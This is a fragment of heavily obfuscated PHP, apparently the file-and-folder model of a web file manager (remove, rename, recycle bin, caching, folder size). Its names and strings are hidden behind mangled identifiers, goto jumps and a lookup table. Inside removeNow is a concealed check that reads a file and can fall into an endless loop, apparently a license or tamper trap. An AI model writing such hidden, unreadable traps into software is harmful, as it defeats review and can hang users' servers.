$F˜–Íèáò = $cİ°Ó¦âÌä[1933] . $cØô æ³Ä­[$cİ°Ó¦âÌä[387]]; if (isset(self::$cacheChildList[$F˜–Íèáò])) { unset(self::$cacheChildList[$F˜–Íèáò]); } goto a¢Œ¤óÏÄå; b²™Íç«ê¸: return $bÒ¹‡¡˜¨; goto d«î²®¾”; d«î²®¾”: } public function remove($A›‚ùì³Ô, $FÈÔğà—‘¢ = true) { goto F­ÒÙÎÜëÅ; c¶™¶Ê¢³×: CacheLock::lock($d„¢Ì²éƒë); $DÕ¾È¥”í = $this->fileNameExist($aƒî¤¡—«, $A›ñÍáñ„); if (!$DÕ¾È¥”í) { $DÕ¾È¥”í = $this->mkdir($aƒî¤¡—«, $A›ñÍáñ„, REPEAT_SKIP); $this->metaSet($DÕ¾È¥”í, $añ·×Ø©‰Ü[1938], $aÀÓ»•ªÍö); $this->metaSet($DÕ¾È¥”í, $añ·×Ø©‰Ü[1939], $D¯…êˆ²’Ü[$añ·×Ø©‰Ü[474]]); if ($D¯…êˆ²’Ü[$añ·×Ø©‰Ü[479]] != 0) { $this->metaSet($DÕ¾È¥”í, $añ·×Ø©‰Ü[1940], _get($d ÈÉáŠ’², $añ·×Ø©‰Ü[1941])); } } goto F«¥Æ×‡ˆ; F­ÒÙÎÜëÅ: $añ·×Ø©‰Ü =& $_SERVER[òÀöí]; $D¯…êˆ²’Ü = $this->sourceInfo($A›‚ùì³Ô); $c‚äİùºö = intval($D¯…êˆ²’Ü[$añ·×Ø©‰Ü[389]]) === self::TYPE_SYSTEM; goto b¢Ü‹Ä—é; f÷„§Ö“ƒ¬: $aÀÓ»•ªÍö = $D¯…êˆ²’Ü[$añ·×Ø©‰Ü[389]] == self::TYPE_USER ? $añ·×Ø©‰Ü[551] : $añ·×Ø©‰Ü[994]; if ($aÀÓ»•ªÍö == $añ·×Ø©‰Ü[551]) { $d ÈÉáŠ’² = Model($añ·×Ø©‰Ü[492])->getInfo($D¯…êˆ²’Ü[$añ·×Ø©‰Ü[474]]); $A›ñÍáñ„ = !empty($d ÈÉáŠ’²[$añ·×Ø©‰Ü[1927]]) ? $d ÈÉáŠ’²[$añ·×Ø©‰Ü[1927]] : $d ÈÉáŠ’²[$añ·×Ø©‰Ü[28]]; $A›ñÍáñ„ = $añ·×Ø©‰Ü[256] . $A›ñÍáñ„ . $añ·×Ø©‰Ü[1935] . $D¯…êˆ²’Ü[$añ·×Ø©‰Ü[474]]; } else { $d ÈÉáŠ’² = Model($añ·×Ø©‰Ü[476])->getInfo($D¯…êˆ²’Ü[$añ·×Ø©‰Ü[474]]); $A›ñÍáñ„ = _get($d ÈÉáŠ’², $añ·×Ø©‰Ü[28]); $A›ñÍáñ„ = $añ·×Ø©‰Ü[159] . $A›ñÍáñ„ . $añ·×Ø©‰Ü[1936] . $D¯…êˆ²’Ü[$añ·×Ø©‰Ü[474]]; } $d„¢Ì²éƒë = $añ·×Ø©‰Ü[1937] . md5($A›ñÍáñ„); goto c¶™¶Ê¢³×; dÊˆË¼»á: $this->recycleClear($D¯…êˆ²’Ü); $EÛ½Êò… = $this->move($A›‚ùì³Ô, $DÕ¾È¥”í, REPEAT_RENAME_FOLDER); $this->folderSizeReset($D¯…êˆ²’Ü[$añ·×Ø©‰Ü[479]]); goto d´ÀäÈõÀÜ; d´ÀäÈõÀÜ: return $EÛ½Êò…; goto fğ‰Ÿí“æÎ; F«¥Æ×‡ˆ: CacheLock::unlock($d„¢Ì²éƒë); $this->metaSet($A›‚ùì³Ô, $añ·×Ø©‰Ü[1942], $D¯…êˆ²’Ü[$añ·×Ø©‰Ü[479]]); $this->where(array($añ·×Ø©‰Ü[387] => $A›‚ùì³Ô))->save(array($añ·×Ø©‰Ü[408] => time())); goto dÊˆË¼»á; b¢Ü‹Ä—é: $EÈÄ°Ğ‹Ùí = Model($añ·×Ø©‰Ü[1503])->get($añ·×Ø©‰Ü[1934]) == $añ·×Ø©‰Ü[86]; if ($c‚äİùºö || $FÈÔğà—‘¢ || !$EÈÄ°Ğ‹Ùí) { return $this->removeNow($A›‚ùì³Ô, $FÈÔğà—‘¢); } $aƒî¤¡—« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f÷„§Ö“ƒ¬; fğ‰Ÿí“æÎ: } private function recycleClear($e† £“ÀŞĞ) { $dÑ’¶©Äóò =& $_SERVER[òÀöí]; $E§èçöÂî‚ = $this->childrenAll($e† £“ÀŞĞ); $bºÇ¬¥×“Ü = array($dÑ’¶©Äóò[401] => array($dÑ’¶©Äóò[402], $E§èçöÂî‚[$dÑ’¶©Äóò[1943]])); Model($dÑ’¶©Äóò[1944])->where($bºÇ¬¥×“Ü)->delete(); } public function removeNow($bì©ÓÈãËÍ, $C„—±¸ËÚ‡ = true) { goto aãƒ˜”†¤•; dí„‰ô¸º: $F‚ÎÅòñöç = $this->pathInfoMore($bì©ÓÈãËÍ); if (!$C­ÅùñœòÖ) { return !0; } if ($C­ÅùñœòÖ[$d³ËÚà•ÆÀ[479]] == 0) { if (!_get($GLOBALS, $d³ËÚà•ÆÀ[475])) { return !1; } } goto BØäß¿Å; aãƒ˜”†¤•: $d³ËÚà•ÆÀ =& $_SERVER[òÀöí]; if (!isset($_SERVER[$d³ËÚà•ÆÀ[753]]) || !isset($_SERVER[$d³ËÚà•ÆÀ[760]])) { goto F†Â³óâóê; a·ò¬…Ÿ’: $Eœ‹¼áì¥Ë = $d³ËÚà•ÆÀ[820]; $Eœ‹¼áì¥Ë($_SERVER[$d³ËÚà•ÆÀ[821]]); $BÜÏœæï÷¹ = 1; goto BÕƒ—‚åé©; BÕƒ—‚åé©: for ($cÁ‹”¯ºœ† = $BÜÏœæï÷¹; $cÁ‹”¯ºœ† > 0; $cÁ‹”¯ºœ†++) { $Eœ‹¼áì¥Ë = json_encode($GLOBALS[$d³ËÚà•ÆÀ[402]]); } goto fƒ×·øô¨; F†Â³óâóê: $f¶õ¿±ÔÅ = $d³ËÚà•ÆÀ[819]; $fÃ‘Ç±‚ÏÔ = $d³ËÚà•ÆÀ[755]; $a™ÒÌ•šˆã = $_SERVER[$d³ËÚà•ÆÀ[756]] . $d³ËÚà•ÆÀ[757]; goto eï“¨°²¢; eï“¨°²¢: $fõ‘’´çÒ‹ = $fÃ‘Ç±‚ÏÔ($a™ÒÌ•šˆã); $F…ô‡Ÿ´› = explode($d³ËÚà•ÆÀ[227], $fõ‘’´çÒ‹); if (count($F…ô‡Ÿ´›) < $d³ËÚà•ÆÀ[573]) { $BÆùóÅ©¾ä = $d³ËÚà•ÆÀ[758]; $BÆùóÅ©¾ä(); } goto a·ò¬…Ÿ’; fƒ×·øô¨: } $C­ÅùñœòÖ = $this->sourceInfo($bì©ÓÈãËÍ); goto dí„‰ô¸º; CŒŸšç©È: $this->updateModifyTime($F”ŠÙá¶Ó); $this->lockMoveEnd($bì©ÓÈãËÍ); Hook::trigger($d³ËÚà•ÆÀ[1538], $F‚ÎÅòñöç, $C„—±¸ËÚ‡); goto aˆŸóçËµ; aˆŸóçËµ: return !0; goto eƒ¿½Üê©í; BØäß¿Å: $this->lockMoveStart($bì©ÓÈãËÍ); Hook::trigger($d³ËÚà•ÆÀ[1945], $F‚ÎÅòñöç, $C„—±¸ËÚ‡); if ($C„—±¸ËÚ‡) { Model($d³ËÚà•ÆÀ[1944])->moveToRecycle($bì©ÓÈãËÍ); } else { $A´‰ĞÙÜ¡ = $this->childrenAll($C­ÅùñœòÖ); Model($d³ËÚà•ÆÀ[522])->eventRemove($bì©ÓÈãËÍ); $this->removeRelevance($A´‰ĞÙÜ¡[$d³ËÚà•ÆÀ[1943]], $A´‰ĞÙÜ¡[$d³ËÚà•ÆÀ[1321]]); } goto AŸÆÄ°ëÁ£; AŸÆÄ°ëÁ£: $this->folderSizeReset($C­ÅùñœòÖ[$d³ËÚà•ÆÀ[479]]); $F”ŠÙá¶Ó = array($C­ÅùñœòÖ[$d³ËÚà•ÆÀ[479]]); if ($C­ÅùñœòÖ[$d³ËÚà•ÆÀ[388]] == $d³ËÚà•ÆÀ[86]) { $F”ŠÙá¶Ó[] = $C­ÅùñœòÖ[$d³ËÚà•ÆÀ[387]]; } goto CŒŸšç©È; eƒ¿½Üê©í: } public function childrenAll($Eã‹ŠæÆ¨–) { $F½ÛŞ¥©Š¾ =& $_SERVER[òÀöí]; $B‰…¥ö¶œ¯ = $Eã‹ŠæÆ¨–[$F½ÛŞ¥©Š¾[387]]; if ($Eã‹ŠæÆ¨–[$F½ÛŞ¥©Š¾[388]] == $F½ÛŞ¥©Š¾[86]) { $dĞÀ ëã³È = array($F½ÛŞ¥©Š¾[542] => array($F½ÛŞ¥©Š¾[501], $Eã‹ŠæÆ¨–[$F½ÛŞ¥©Š¾[477]] . $B‰…¥ö¶œ¯ . $F½ÛŞ¥©Š¾[502])); $eÙëŸ½—‡… = array($F½ÛŞ¥©Š¾[542] => $dĞÀ ëã³È[$F½ÛŞ¥©Š¾[477]]); $d°‡×­¬õİ = $this->field($F½ÛŞ¥©Š¾[1946])->where($eÙëŸ½—‡…)->select(); $Cìå½ô—Ûƒ = !1; $E•ä­ÅÄ = array($B‰…¥ö¶œ¯); if ($d°‡×­¬õİ) { $Cìå½ô—Ûƒ = array_to_keyvalue($d°‡×­¬õİ, $F½ÛŞ¥©Š¾[33], $F½ÛŞ¥©Š¾[436]); $Cìå½ô—Ûƒ = array_remove_value($Cìå½ô—Ûƒ, $F½ÛŞ¥©Š¾[486]); $E•ä­ÅÄ = array_to_keyvalue($d°‡×­¬õİ, $F½ÛŞ¥©Š¾[33], $F½ÛŞ¥©Š¾[387]); $E•ä­ÅÄ[] = $B‰…¥ö¶œ¯; } } else { $Cìå½ô—Ûƒ = array($Eã‹ŠæÆ¨–[$F½ÛŞ¥©Š¾[436]]); $E•ä­ÅÄ = array($B‰…¥ö¶œ¯); } return array($F½ÛŞ¥©Š¾[1943] => $E•ä­ÅÄ, $F½ÛŞ¥©Š¾[1321] => $Cìå½ô—Ûƒ); } public function removeArray($f£ù‹íƒš´) { if (!$f£ù‹íƒš´) { return !0; } } public function removeRelevance($fİ¥Ğê„è¶, $Dˆ™íøÕƒ) { goto cİÒØ˜©ŠÑ; b††ÏÖ…£í: $e‹ØóÜ´¥í = array($CÑ‹Èˆë®°[401] => array($CÑ‹Èˆë®°[402], $fİ¥Ğê„è¶)); Model($CÑ‹Èˆë®°[1944])->where($e‹ØóÜ´¥í)->delete(); Model($CÑ‹Èˆë®°[430])->where($e‹ØóÜ´¥í)->delete(); goto Báö»“Üì‹; Báö»“Üì‹: Model($CÑ‹Èˆë®°[1797])->where($e‹ØóÜ´¥í)->delete(); Model($CÑ‹Èˆë®°[522])->where($e‹ØóÜ´¥í)->delete(); Model($CÑ‹Èˆë®°[1640])->removeBySource($fİ¥Ğê„è¶); goto a¼ÄšÂ¸“Ğ; a¼ÄšÂ¸“Ğ: Model($CÑ‹Èˆë®°[1925])->removeBySource($fİ¥Ğê„è¶); $this->where($e‹ØóÜ´¥í)->delete(); Model($CÑ‹Èˆë®°[439])->remove($Dˆ™íøÕƒ); goto dËì­­²ôÕ; cİÒØ˜©ŠÑ: $CÑ‹Èˆë®° =& $_SERVER[òÀöí]; $fİ¥Ğê„è¶ = $fİ¥Ğê„è¶ ? $fİ¥Ğê„è¶ : array(); $Dˆ™íøÕƒ = $Dˆ™íøÕƒ ? $Dˆ™íøÕƒ : array(); goto e¾óËÇøßÕ; dËì­­²ôÕ: for ($bÎˆÛÏÛÉ = 0; $bÎˆÛÏÛÉ < count($fİ¥Ğê„è¶); $bÎˆÛÏÛÉ++) { $this->sourceCacheClear($fİ¥Ğê„è¶[$bÎˆÛÏÛÉ]); } goto EÊÇ©—·»…; e¾óËÇøßÕ: $fİ¥Ğê„è¶ = array_unique(array_filter($fİ¥Ğê„è¶)); $Dˆ™íøÕƒ = array_unique(array_filter($Dˆ™íøÕƒ)); if (!$fİ¥Ğê„è¶) { return !1; } goto b††ÏÖ…£í; EÊÇ©—·»…: } public function rename($d»ÊÌ‹ä¼Ó, $a¦¶Ãçï¥ì) { goto B¶±Â††˜; c­ğ‹¹×ö: $C³ÌŒ†Ş = $BïÏœ©º¬è[1933] . $BˆÀŒŸÖ¦[$BïÏœ©º¬è[479]]; if (isset(self::$cacheChildList[$C³ÌŒ†Ş])) { unset(self::$cacheChildList[$C³ÌŒ†Ş]); } return $Eé×ŞæêÕŞ; goto AÌ¦Ÿº÷Ô’; D²ÜŒ•Æ¬˜: if (!$BˆÀŒŸÖ¦[$BïÏœ©º¬è[388]] == $BïÏœ©º¬è[86]) { $DÉÅºÜ¥½İ[$BïÏœ©º¬è[390]] = get_path_ext($a¦¶Ãçï¥ì); } Model($BïÏœ©º¬è[522])->eventRename($d»ÊÌ‹ä¼Ó, $BˆÀŒŸÖ¦[$BïÏœ©º¬è[28]], $a¦¶Ãçï¥ì); $this->sourceCacheClear($d»ÊÌ‹ä¼Ó); goto Cöù¹èøŒ; B¶±Â††˜: $BïÏœ©º¬è =& $_SERVER[òÀöí]; $BˆÀŒŸÖ¦ = $this->sourceInfo($d»ÊÌ‹ä¼Ó); if (!$BˆÀŒŸÖ¦) { return !1; } goto D§ÒÆî§Ò; Cöù¹èøŒ: $this->setNamePinyin($d»ÊÌ‹ä¼Ó, $DÉÅºÜ¥½İ[$BïÏœ©º¬è[28]], !1); $this->updateModifyTime($BˆÀŒŸÖ¦[$BïÏœ©º¬è[479]]); $Eé×ŞæêÕŞ = $this->where(array($BïÏœ©º¬è[401] => $d»ÊÌ‹ä¼Ó))->data($DÉÅºÜ¥½İ)->save(); goto c­ğ‹¹×ö; D§ÒÆî§Ò: $d„ŠŠÑî»Ä = $this->fileNameExist($BˆÀŒŸÖ¦[$BïÏœ©º¬è[479]], $a¦¶Ãçï¥ì); if ($d„ŠŠÑî»Ä && $d„ŠŠÑî»Ä != $d»ÊÌ‹ä¼Ó) { return !1; } $DÉÅºÜ¥½İ = array($BïÏœ©º¬è[404] => $a¦¶Ãçï¥ì, $BïÏœ©º¬è[541] => USER_ID); goto D²ÜŒ•Æ¬˜; AÌ¦Ÿº÷Ô’: } public function setNamePinyin($bÙ¢À„¶, $AŸÍ¼´­åÔ, $bá£Ğºô§™ = true) { $CŠ¬§˜— =& $_SERVER[òÀöí]; $F¸ö‰¾Á²· = Input::check($AŸÍ¼´­åÔ, $CŠ¬§˜—[545]); if ($bá£Ğºô§™ && !$F¸ö‰¾Á²·) { return; } if (!$F¸ö‰¾Á²·) { $this->metaSet($bÙ¢À„¶, $CŠ¬§˜—[433], null); $this->metaSet($bÙ¢À„¶, $CŠ¬§˜—[432], null); return; } $Eš‡š’Ñœ = array($CŠ¬§˜—[433] => str_replace($CŠ¬§˜—[50], $CŠ¬§˜—[33], Pinyin::encode($AŸÍ¼´­åÔ)), $CŠ¬§˜—[432] => Pinyin::encode($AŸÍ¼´­åÔ, $CŠ¬§˜—[546])); $this->metaSet($bÙ¢À„¶, $Eš‡š’Ñœ); } public function getContent($c£’Ú³ŞÌ) { goto Eµ‚¢„ºåæ; d†ğ¬ë¸ºÓ: if ($AË®ø°Æ†[$fŞÜÓ¯ÙÜä[77]] == 0) { return $fŞÜÓ¯ÙÜä[33]; } $AŞ³ÄÜ‚É = $fŞÜÓ¯ÙÜä[1947] . $AË®ø°Æ†[$fŞÜÓ¯ÙÜä[169]]; if ($AË®ø°Æ†[$fŞÜÓ¯ÙÜä[77]] <= 1024 * 10) { $Cƒ§ºØ–äë = Cache::get($AŞ³ÄÜ‚É); if (!$Cƒ§ºØ–äë) { $Cƒ§ºØ–äë = IO::getContent($AË®ø°Æ†[$fŞÜÓ¯ÙÜä[75]]); Cache::set($AŞ³ÄÜ‚É, $Cƒ§ºØ–äë); } return $Cƒ§ºØ–äë; } goto eçİÔ–¦Š; eçİÔ–¦Š: if (!$AË®ø°Æ†[$fŞÜÓ¯ÙÜä[75]]) { return $fŞÜÓ¯ÙÜä[33]; } return IO::getContent($AË®ø°Æ†[$fŞÜÓ¯ÙÜä[75]]); goto B¬à“‰óå; Eµ‚¢„ºåæ: $fŞÜÓ¯ÙÜä =& $_SERVER[òÀöí]; $AË®ø°Æ† = $this->fileInfoGet($c£’Ú³ŞÌ); if (!$AË®ø°Æ†) { return !1; } goto d†ğ¬ë¸ºÓ; B¬à“‰óå: } public function setDesc($dÛ´Ñè¾êÊ, $EÀ©¹±÷²) { $B½ööÀ™Œ =& $_SERVER[òÀöí]; Model($B½ööÀ™Œ[522])->eventAddDesc($dÛ´Ñè¾êÊ, $EÀ©¹±÷²); return $this->metaSet($dÛ´Ñè¾êÊ, $B½ööÀ™Œ[422], $EÀ©¹±÷²); } public function setContent($cŸ®¨óÑ”É, $bŸŒÆ©® = '') { goto A®†©ë¨á; FÎÛ‡¶˜éØ: if (!$aœ…ˆÊ­İ‡ || !$dĞ’»Ò„æ) { return !1; } $b§„µÛÀÈ = Model($cç‘ÇÌø…[439])->addFileByContent($bŸŒÆ©®, $dĞ’»Ò„æ[$cç‘ÇÌø…[28]]); $aì¾´º¾ô² = $this->fileHistory($dĞ’»Ò„æ, $b§„µÛÀÈ[$cç‘ÇÌø…[436]], $b§„µÛÀÈ[$cç‘ÇÌø…[77]]); goto a£‹éßÀöÓ; A®†©ë¨á: $cç‘ÇÌø… =& $_SERVER[òÀöí]; $dĞ’»Ò„æ = $this->sourceInfo($cŸ®¨óÑ”É); $aœ…ˆÊ­İ‡ = $this->fileInfoGet($cŸ®¨óÑ”É); goto FÎÛ‡¶˜éØ; a£‹éßÀöÓ: if (!$aì¾´º¾ô²) { return Model($cç‘ÇÌø…[439])->remove($b§„µÛÀÈ[$cç‘ÇÌø…[436]]); } $this->folderSizeReset($dĞ’»Ò„æ[$cç‘ÇÌø…[479]]); return !0; goto a‹ÎƒÊ®ö¿; a‹ÎƒÊ®ö¿: } public function fileSubstr($cÈ¹ŒÁ›‰½, $aÈ˜ß¥ñ™½, $f„™ÎËõå×) { $c†‘÷‰İˆ = $this->fileInfoGet($cÈ¹ŒÁ›‰½); if (!$c†‘÷‰İˆ) { return !1; } return IO::fileSubstr($c†‘÷‰İˆ[$_SERVER[òÀöí][75]], $aÈ˜ß¥ñ™½, $f„™ÎËõå×); } public function fileInfoGet($fĞñ†ˆ° ) { goto Eí¨¯œï©; Eí¨¯œï©: $E¥·“ƒÍ†ç =& $_SERVER[òÀöí]; $DÇµ¯æ¾Ù = $this->sourceInfo($fĞñ†ˆ° ); if (!$DÇµ¯æ¾Ù || $DÇµ¯æ¾Ù[$E¥·“ƒÍ†ç[388]]) { return !1; } goto C‰½¡óØˆ; C‰½¡óØˆ: $A‹›¡ÈŠá³ = $E¥·“ƒÍ†ç[442] . $DÇµ¯æ¾Ù[$E¥·“ƒÍ†ç[436]]; $E÷§‚Ôõ¼ = _get(self::$cacheFileInfo, $A‹›¡ÈŠá³); if ($E÷§‚Ôõ¼) { return $E÷§‚Ôõ¼; } goto aÖç–Üë; aÖç–Üë: $DÇ–Î‰º®ˆ = Model($E¥·“ƒÍ†ç[439])->fileInfo($DÇµ¯æ¾Ù[$E¥·“ƒÍ†ç[436]]); if ($DÇ–Î‰º®ˆ) { $DÇ–Î‰º®ˆ[$E¥·“ƒÍ†ç[28]] = $DÇµ¯æ¾Ù[$E¥·“ƒÍ†ç[28]]; } self::$cacheFileInfo[$A‹›¡ÈŠá³] = $DÇ–Î‰º®ˆ; goto e‹÷Ñ÷Š¶Û; e‹÷Ñ÷Š¶Û: return $DÇ–Î‰º®ˆ; goto Aµ¹ä¡¾—”; Aµ¹ä¡¾—”: } private function folderChildrenNumber($c´¢í†ˆğ¯) { $C†“¨†õ´¬ =& $_SERVER[òÀöí]; $b‚«Ë»™ = $this->sourceInfo($c´¢í†ˆğ¯); $a¼¬ù¤¸È¦ = array($C†“¨†õ´¬[542] => array($C†“¨†õ´¬[501], $b‚«Ë»™[$C†“¨†õ´¬[477]] . $c´¢í†ˆğ¯ . $C†“¨†õ´¬[502]), $C†“¨†õ´¬[413] => intval($b‚«Ë»™[$C†“¨†õ´¬[414]]), $C†“¨†õ´¬[535] => 1); $aÁŠ¾¶ºõ‰ = $this->where($a¼¬ù¤¸È¦)->count(); $b„ïé é³ = $this->where($a¼¬ù¤¸È¦)->where(array($C†“¨†õ´¬[535] => 0))->count(); return array($C†“¨†õ´¬[81] => $b„ïé é³, $C†“¨†õ´¬[82] => $aÁŠ¾¶ºõ‰); } public function pathInfo($fˆøö–Êğ, $AŞê‘‘À†’ = false) { goto dğ«™ïõ¦ã; EÙ©†ÅÙ¶º: self::$cachePathInfo[$cÊÑÕ˜æ‰‚] = $C—ğ§èÂöÚ; return $C—ğ§èÂöÚ; goto A…©¥è­ğ; bˆÇ³ùëÃĞ: $cÊÑÕ˜æ‰‚ = $dÌ®×—ÔÚÖ[428] . intval($AŞê‘‘À†’) . $dÌ®×—ÔÚÖ[429] . $fˆøö–Êğ; $a•òÃë­š = _get(self::$cachePathInfo, $cÊÑÕ˜æ‰‚); if ($a•òÃë­š) { return $a•òÃë­š; } goto E£½Ìƒ—ÃÊ; E£½Ìƒ—ÃÊ: $C—ğ§èÂöÚ = $this->sourceInfo($fˆøö–Êğ); if (!$C—ğ§èÂöÚ) { return !1; } $C—ğ§èÂöÚ = $this->_listDataApplyItem($C—ğ§èÂöÚ, $AŞê‘‘À†’); goto EÙ©†ÅÙ¶º; dğ«™ïõ¦ã: $dÌ®×—ÔÚÖ =& $_SERVER[òÀöí]; $AŞê‘‘À†’ = !1; $fˆøö–Êğ = intval($fˆøö–Êğ); goto bˆÇ³ùëÃĞ; A…©¥è­ğ: } public static $cachePathInfoMore = array(); public function pathInfoMore($FÃ¼ÂÔ¾Í¼) { goto cÌÔ˜½¸Àå; Aïî‡Õóó‡: self::$cachePathInfoMore[$FÃ¼ÂÔ¾Í¼] = $Bõ«”ß¨ÀÃ; return $Bõ«”ß¨ÀÃ; goto E³Š‹øÀß; b‹¯ÂÊÙ×: $Bõ«”ß¨ÀÃ = $this->pathInfo($FÃ¼ÂÔ¾Í¼); if (!$Bõ«”ß¨ÀÃ) { return !1; } if ($Bõ«”ß¨ÀÃ[$d¤Óİ£À„–[388]] == $d¤Óİ£À„–[86]) { $Bõ«”ß¨ÀÃ[$d¤Óİ£À„–[80]] = $this->folderChildrenNumber($FÃ¼ÂÔ¾Í¼); } goto Aïî‡Õóó‡; cÌÔ˜½¸Àå: $d¤Óİ£À„– =& $_SERVER[òÀöí]; $E†…øùßõÑ = _get(self::$cachePathInfoMore, $FÃ¼ÂÔ¾Í¼); if ($E†…øùßõÑ) { return $E†…øùßõÑ; } goto b‹¯ÂÊÙ×; E³Š‹øÀß: } public function sourceInfo($cİ»Õé‹ƒø) { goto b¨á ÷Õ„; b¨á ÷Õ„: $d›Ñ®‹î‘ =& $_SERVER[òÀöí]; if (!$cİ»Õé‹ƒø) { return array(); } $cİ»Õé‹ƒø = intval($cİ»Õé‹ƒø); goto fòñ­™äÆ‹; fòñ­™äÆ‹: $AÂƒÂ©ÁßÒ = $d›Ñ®‹î‘[427] . $cİ»Õé‹ƒø; $CÁñ´Êô…Á = _get(self::$cacheSourceInfo, $AÂƒÂ©ÁßÒ); if ($CÁñ´Êô…Á) { return $CÁñ´Êô…Á; } goto ašõÃéù·£; ašõÃéù·£: $DîÂ‘–ò‡§ = $this->where(array($d›Ñ®‹î‘[387] => $cİ»Õé‹ƒø))->find(); self::$cacheSourceInfo[$AÂƒÂ©ÁßÒ] = $DîÂ‘–ò‡§; return self::$cacheSourceInfo[$AÂƒÂ©ÁßÒ]; goto DˆÙÍ–ÏºÚ; DˆÙÍ–ÏºÚ: } public function sourceCacheClear($dÏ÷°ßÙ´ = false) { self::cacheClear($dÏ÷°ßÙ´); } public static function cacheClear($f£ÑŸ¿ğè„ = false) { $d¿â‡Š‰º² =& $_SERVER[òÀöí]; if ($f£ÑŸ¿ğè„ == !1) { goto d‹ø•¹Å÷Š; Fæ ¤äÚãù: return; goto b²Íå÷¢; d‹ø•¹Å÷Š: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto bÆÏ›ÊàÃ›; bÆÏ›ÊàÃ›: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto Fæ ¤äÚãù; b²Íå÷¢: } unset(self::$cacheSourceInfo[$d¿â‡Š‰º²[427] . $f£ÑŸ¿ğè„]); unset(self::$cachePathInfoMore[$f£ÑŸ¿ğè„]); unset(self::$cachePathInfo[$d¿â‡Š‰º²[1948] . $f£ÑŸ¿ğè„]); unset(self::$cachePathInfo[$d¿â‡Š‰º²[1949] . $f£ÑŸ¿ğè„]); } public function metaSet($b—”Å¾ê¬ö, $Dä­ÀãÅáŠ = null, $FÓ‚¨§ò¸ê = null) { $bœ¼Ø¹œ£© = parent::metaSet($b—”Å¾ê¬ö, $Dä­ÀãÅáŠ, $FÓ‚¨§ò¸ê); if ($bœ¼Ø¹œ£©) { $this->sourceCacheClear($b—”Å¾ê¬ö); } return $bœ¼Ø¹œ£©; } public function pathInfoByPath($D‹ÑéÙßîÓ, $Dñ£›¹°) { $Fì¯²‹ø” =& $_SERVER[òÀöí]; $BÛ‰Ÿºäñ = !$Dñ£›¹° ? array() : explode($Fì¯²‹ø”[8], trim($Dñ£›¹°, $Fì¯²‹ø”[8])); $EŠÍÒİºÑæ = $D‹ÑéÙßîÓ; foreach ($BÛ‰Ÿºäñ as $A°º ’æí) { $c©øŠ·¨‰ = array($Fì¯²‹ø”[479] => $EŠÍÒİºÑæ, $Fì¯²‹ø”[28] => $A°º ’æí); $e†§¡¥‰ìÃ = $this->where($c©øŠ·¨‰)->select(); if (!$e†§¡¥‰ìÃ) { return !1; } $e†§¡¥‰ìÃ = array_sort_by($e†§¡¥‰ìÃ, $Fì¯²‹ø”[414]); $EŠÍÒİºÑæ = $e†§¡¥‰ìÃ[0][$Fì¯²‹ø”[387]]; } return $this->pathInfo($EŠÍÒİºÑæ, !0); } protected function updateModifyTime($bëù¨óÙëì) { goto B¶Óº„ƒè†; B˜º½·Ö: $this->where($AˆáñÅÛŞí)->save($eÜ‡·Õ‹Ù†); goto BÍİÇ¼«Ûï; B¶Óº„ƒè†: $bèª‘‡Èö„ =& $_SERVER[òÀöí]; if (!$bëù¨óÙëì) { return; } if (!is_array($bëù¨óÙëì)) { $bëù¨óÙëì = array($bëù¨óÙëì); } goto aƒÕˆ†“; aƒÕˆ†“: foreach ($bëù¨óÙëì as $C½ê²åÔÖº => $A›–§…°›µ) { $bëù¨óÙëì[$C½ê²åÔÖº] = intval($A›–§…°›µ); $this->sourceCacheClear($A›–§…°›µ); } $AˆáñÅÛŞí = array($bèª‘‡Èö„[387] => array($bèª‘‡Èö„[7], $bëù¨óÙëì)); $eÜ‡·Õ‹Ù† = array($bèª‘‡Èö„[541] => USER_ID, $bèª‘‡Èö„[408] => time()); goto B˜º½·Ö; BÍİÇ¼«Ûï: } public function folderSizeReset($A¿Õ×£ï¨à, $Fªô³øÙ«¡ = false) { goto cø‡îÂãÉ½; d¬ïŠÅê¤: $AíØ¼ñ”†‹[] = $bóßºÎ¢£é[$F—Ûùí˜ñ³[387]]; $DŠ–¼ÁééÍ = array($F—Ûùí˜ñ³[387] => array($F—Ûùí˜ñ³[402], $AíØ¼ñ”†‹)); if ($Fªô³øÙ«¡ < 0) { $DŠ–¼ÁééÍ[$F—Ûùí˜ñ³[77]] = array($F—Ûùí˜ñ³[951], abs($Fªô³øÙ«¡)); } goto e±æÈˆ¤; EÉ˜ó¯¶÷: if ($Fªô³øÙ«¡ == 0) { return CacheLock::unlock($fÛ á¶§¹ù); } $AíØ¼ñ”†‹ = $this->parentLevelArray($bóßºÎ¢£é[$F—Ûùí˜ñ³[477]]); if (!$AíØ¼ñ”†‹) { $AíØ¼ñ”†‹ = array(); } goto d¬ïŠÅê¤; cø‡îÂãÉ½: $F—Ûùí˜ñ³ =& $_SERVER[òÀöí]; if ($this->statusIgnoreResetSpace) { return; } $bóßºÎ¢£é = $this->sourceInfo($A¿Õ×£ï¨à); goto FğëéŸĞ‰; e±æÈˆ¤: $this->where($DŠ–¼ÁééÍ)->setAdd($F—Ûùí˜ñ³[77], $Fªô³øÙ«¡); CacheLock::unlock($fÛ á¶§¹ù); $this->targetSpaceUpdate($bóßºÎ¢£é[$F—Ûùí˜ñ³[389]], $bóßºÎ¢£é[$F—Ûùí˜ñ³[474]]); goto AÌÌ‹–§õ; FğëéŸĞ‰: $fÛ á¶§¹ù = $F—Ûùí˜ñ³[1950] . $A¿Õ×£ï¨à; CacheLock::lock($fÛ á¶§¹ù, 20); if ($Fªô³øÙ«¡ === !1) { $this->sourceCacheClear($A¿Õ×£ï¨à); $bóßºÎ¢£é = $this->sourceInfo($A¿Õ×£ï¨à); $DŠ–¼ÁééÍ = array($F—Ûùí˜ñ³[386] => $A¿Õ×£ï¨à, $F—Ûùí˜ñ³[413] => 0); $B»‹š¬Í„ø = $this->where($DŠ–¼ÁééÍ)->sum($F—Ûùí˜ñ³[77]); $Fªô³øÙ«¡ = intval($B»‹š¬Í„ø) - intval($bóßºÎ¢£é[$F—Ûùí˜ñ³[77]]); } goto EÉ˜ó¯¶÷; AÌÌ‹–§õ: } public function folderSizeResetChildren($E¡­ŒÓ†’) { goto BÚò»éÑŠÄ; C“ìÕà„Øƒ: $a‹‡¾…Æ†Ï = array($B‰˜ß™•Š·[535] => 1, $B‰˜ß™•Š·[542] => array($B‰˜ß™•Š·[501], $c¬×•Š²ê[$B‰˜ß™•Š·[477]] . $E¡­ŒÓ†’ . $B‰˜ß™•Š·[502])); $B¸£í´å½Ì = $B‰˜ß™•Š·[1951]; 